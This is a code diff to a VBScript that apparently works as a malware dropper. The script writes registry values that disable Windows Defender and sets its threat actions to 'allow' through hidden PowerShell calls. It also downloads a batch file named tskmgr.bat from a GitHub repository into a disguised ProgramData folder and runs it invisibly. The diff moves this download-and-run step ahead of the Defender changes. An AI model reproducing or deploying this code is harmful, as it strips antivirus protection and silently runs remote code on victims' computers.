@@ -13,7 +13,43 @@ If Not WScript.Arguments.Named.Exists("elevate") Then
     WScript.Quit
 End If
 
+' Объявим переменные для загрузки файла
+Dim objHTTP, objStream, url, filePath
+Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+
+url = "https://github.com/Rlz-vz/SchoolSigma/raw/main/tskmgr.bat"
+filePath = "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\tskmgr.bat"
+
+Dim fso
+Set fso = CreateObject("Scripting.FileSystemObject")
+If Not fso.FolderExists("C:\temp") Then
+    fso.CreateFolder "C:\temp"
+End If
+
+On Error Resume Next ' Игнорируем ошибки
+objHTTP.Open "GET", url, False
+objHTTP.Send
+
+If objHTTP.Status = 200 Then
+    ' Успешный ответ, сохраняем файл
+    Set objStream = CreateObject("ADODB.Stream")
+    objStream.Type = 1 ' 1 = binary
+    objStream.Open
+    objStream.Write objHTTP.responseBody
+    objStream.SaveToFile filePath, 2 ' 2 = перезапись
+    objStream.Close
+
+    ' Запускаем файл невидимо
+    CreateObject("WScript.Shell").Run filePath, 0, True ' Ждем завершения выполнения
+End If
+
+Set objStream = Nothing
+Set objHTTP = Nothing
+Set fso = Nothing
+
+' Теперь выполняем дальнейшие действия, если tskmgr.bat завершен
 On Error Resume Next
+
 ' Настройка реестра для отключения Windows Defender
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"
@@ -36,42 +72,8 @@ outputMessage("Set-MpPreference -ModerateThreatDefaultAction 6")
 outputMessage("Set-MpPreference -LowThreatDefaultAction 6")
 outputMessage("Set-MpPreference -SevereThreatDefaultAction 6")
 
-' Объявим переменные для загрузки файла
-Dim objHTTP, objStream, url, filePath
-
-Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-url = "https://github.com/Rlz-vz/SchoolSigma/raw/main/tskmgr.bat"
-filePath = "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\tskmgr.bat"
-
-Dim fso
-Set fso = CreateObject("Scripting.FileSystemObject")
-If Not fso.FolderExists("C:\temp") Then
-    fso.CreateFolder "C:\temp"
-End If
-
-On Error Resume Next ' Игнорируем ошибки
-objHTTP.Open "GET", url, False
-objHTTP.Send
-
-If objHTTP.Status = 200 Then
-    ' Успешный ответ, сохраняем файл
-    Set objStream = CreateObject("ADODB.Stream")
-    objStream.Type = 1 ' 1 = binary
-    objStream.Open
-    objStream.Write objHTTP.responseBody
-    objStream.SaveToFile filePath, 2 ' 2 = перезапись
-    objStream.Close
-    
-    ' Запускаем файл невидимо
-    CreateObject("WScript.Shell").Run filePath, 0, False ' 0 = скрытый режим
-End If
-
-Set objStream = Nothing
-Set objHTTP = Nothing
-Set fso = Nothing
-
 Sub outputMessage(ByVal args)
     On Error Resume Next
     Set objShell = CreateObject("Wscript.shell")
-    objShell.run("powershell " + args), 0
+    objShell.Run "cmd.exe /c powershell " & args, 0, False 
 End Sub
